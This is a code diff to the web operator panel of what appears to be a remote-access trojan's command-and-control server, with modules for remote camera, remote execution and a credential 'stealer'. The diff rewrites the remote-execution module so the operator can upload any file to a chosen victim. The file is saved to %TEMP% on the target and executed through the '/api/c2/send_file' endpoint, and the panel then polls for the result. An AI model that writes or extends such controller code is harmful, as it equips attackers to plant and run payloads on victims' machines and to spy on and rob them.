@@ -497,8 +497,8 @@
                     Remote Camera
                 </button>
                 <button class="module-nav-item" data-module="remote-exec">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-                    Remote Exec
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                    Send File
                 </button>
                 <button class="module-nav-item" data-module="stealer">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
@@ -885,18 +885,17 @@ C:\&gt;</div>
                 </div>
             </div>
 
-            <!-- Remote Exec -->
+            <!-- Send File -->
             <div class="module-panel" id="mod-remote-exec">
                 <header class="header">
-                    <h2>Remote Execution</h2>
-                    <p class="subtitle">Execute files on the target machine</p>
+                    <h2>Send File</h2>
+                    <p class="subtitle">Upload a file from this machine — it will be saved to %TEMP% on the target and executed</p>
                 </header>
                 <div class="panel-card">
                     <div class="form-group" style="margin-bottom:12px;">
-                        <label style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-muted);display:block;margin-bottom:6px;">File Path on Target</label>
-                        <input type="text" id="exec-path" placeholder="e.g. C:\Users\user\Desktop\file.exe"
-                            style="width:100%;padding:9px 12px;background:var(--bg-raised);border:1px solid var(--border-color);border-radius:8px;color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;box-sizing:border-box;transition:border-color 0.2s;"
-                            onfocus="this.style.borderColor='rgba(196,154,60,0.35)'" onblur="this.style.borderColor='var(--border-color)'">
+                        <label style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-muted);display:block;margin-bottom:6px;">File</label>
+                        <input type="file" id="exec-file"
+                            style="width:100%;padding:8px 0;color:var(--text-primary);font-size:13px;outline:none;cursor:pointer;">
                     </div>
                     <div class="form-group" style="margin-bottom:16px;">
                         <label style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-muted);display:block;margin-bottom:6px;">Arguments <span style="font-weight:400;text-transform:none;">(optional)</span></label>
@@ -905,8 +904,8 @@ C:\&gt;</div>
                             onfocus="this.style.borderColor='rgba(196,154,60,0.35)'" onblur="this.style.borderColor='var(--border-color)'">
                     </div>
                     <button class="btn btn-primary" id="btn-remote-exec" style="padding:8px 22px;">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:6px;vertical-align:middle;"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-                        Execute
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:6px;vertical-align:middle;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                        Send &amp; Execute
                     </button>
                     <div id="exec-result" style="margin-top:14px;font-size:12px;font-family:var(--font-mono);"></div>
                 </div>
@@ -1147,32 +1146,54 @@ C:\&gt;</div>
             }, 'Sleep', false);
         });
 
-        // Remote Execution
+        // Send File to Disk
         document.getElementById('btn-remote-exec').addEventListener('click', async () => {
-            const path = document.getElementById('exec-path').value.trim();
+            const fileInput = document.getElementById('exec-file');
             const args = document.getElementById('exec-args').value.trim();
             const resultEl = document.getElementById('exec-result');
-            if (!path) { resultEl.innerHTML = '<span style="color:#d95f5f;">Path is required.</span>'; return; }
-            resultEl.innerHTML = '<span style="color:var(--text-muted);">Sending command...</span>';
+            const btn = document.getElementById('btn-remote-exec');
+            if (!fileInput.files || !fileInput.files[0]) {
+                resultEl.innerHTML = '<span style="color:#d95f5f;">Select a file first.</span>';
+                return;
+            }
+            const file = fileInput.files[0];
+            resultEl.innerHTML = '<span style="color:var(--text-muted);">Uploading ' + escapeHtml(file.name) + '...</span>';
+            btn.disabled = true;
             try {
-                await fetch('/api/c2/command', { method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({ client_id: clientId, command: 'remote_exec:' + path + (args ? '|' + args : '') }) });
+                const form = new FormData();
+                form.append('file', file);
+                form.append('args', args);
+                const uploadRes = await fetch('/api/c2/send_file/' + encodeURIComponent(clientId), { method: 'POST', body: form });
+                const uploadData = await uploadRes.json();
+                if (!uploadData.success) {
+                    resultEl.innerHTML = '<span style="color:#d95f5f;">Upload failed: ' + escapeHtml(uploadData.error || 'unknown') + '</span>';
+                    btn.disabled = false;
+                    return;
+                }
+                resultEl.innerHTML = '<span style="color:var(--text-muted);">Sent — waiting for execution result...</span>';
                 let attempts = 0;
                 const poll = setInterval(async () => {
                     attempts++;
-                    if (attempts > 20) { clearInterval(poll); resultEl.innerHTML = '<span style="color:var(--text-muted);">Timeout — no response.</span>'; return; }
+                    if (attempts > 30) {
+                        clearInterval(poll);
+                        btn.disabled = false;
+                        resultEl.innerHTML = '<span style="color:var(--text-muted);">Timeout — no response from client.</span>';
+                        return;
+                    }
                     try {
                         const r = await fetch('/api/c2/exec/result/' + encodeURIComponent(clientId));
                         const d = await r.json();
                         if (d && d.success !== undefined) {
                             clearInterval(poll);
+                            btn.disabled = false;
                             resultEl.innerHTML = d.success
-                                ? `<span style="color:#5fba74;">Launched: ${escapeHtml(d.path || path)}</span>`
+                                ? `<span style="color:#5fba74;">Executed: ${escapeHtml(d.path || file.name)}</span>`
                                 : `<span style="color:#d95f5f;">Error: ${escapeHtml(d.error || 'unknown')}</span>`;
                         }
                     } catch {}
-                }, 400);
+                }, 500);
             } catch (err) {
+                btn.disabled = false;
                 resultEl.innerHTML = '<span style="color:#d95f5f;">Error: ' + escapeHtml(err.message) + '</span>';
             }
         });
